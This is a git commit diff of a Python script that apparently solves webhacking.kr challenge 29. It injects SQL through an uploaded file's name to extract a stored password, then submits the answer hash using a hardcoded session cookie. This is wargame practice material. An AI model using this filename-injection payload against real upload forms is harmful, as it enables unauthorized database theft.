dcf1cb89bb7009c661968c3d8de5eccdeeec324c
bindon <bindon@Creator-PC>
2018-07-29 21:06:15 +0900

    Clear Challenge29

--- Challenge29.py
+++ Challenge29.py
@@ -1,16 +1,53 @@
 #-*- coding: utf-8 -*-
+import urllib
 import urllib2
+
 import requests
+
 import CookieManager
 
 
-challengeUrl = "http://webhacking.kr/challenge/web/web-14/index.php"
+ipAddress = ""
+httpConnection = None
+print "[+] Find IP Address"
+try:
+    httpRequest = urllib2.Request("https://api.ipify.org")
+    httpConnection = urllib2.urlopen(httpRequest)
+    ipAddress = httpConnection.read()
+    print "[*] Your IP Address is [", ipAddress, "]"
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
 
+challengeUrl = "http://webhacking.kr/challenge/web/web-14/index.php"
 CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
 
-parameter = urllib.quote("0) or no>1 --")
-httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
+uploadFile = {
+    "upfile": ("bindon131',(select password from c29_tb),0x" + ipAddress.encode('hex') + ")-- ", "bindon")
+}
+sessionCookie = {
+    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
+}
+
+httpConnection = None
+try:
+    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
+    print httpRequest.text
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
+
+challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
+parameter = urllib.urlencode({
+    "answer": "70d8f5b353fa0fb765f04a67832ed57c"
+});
+httpRequest = urllib2.Request(challengeUrl, data=parameter)
 httpRequest.add_header("Cookie", CookieManager.getCookie())
+httpRequest.get_method = lambda: 'POST'
 
 httpConnection = None
 try:
@@ -22,27 +59,3 @@ except:
 finally:
     if httpConnection != None:
         httpConnection.close()
-
-"""
-uploadFile = {
-    "upfile": open(".project", "rb")
-}
-
-sessionCookie = {
-    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
-}
-
-httpConnection = None
-try:
-    print CookieManager.getCookie()
-    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
-    #httpRequest.add_header("Cookie", CookieManager.getCookie())
-    #httpConnection = urllib2.urlopen(httpRequest)
-    #httpResponse = httpConnection.read()
-    print httpRequest.text
-except:
-    raise
-finally:
-    if httpConnection != None:
-        httpConnection.close()
-"""
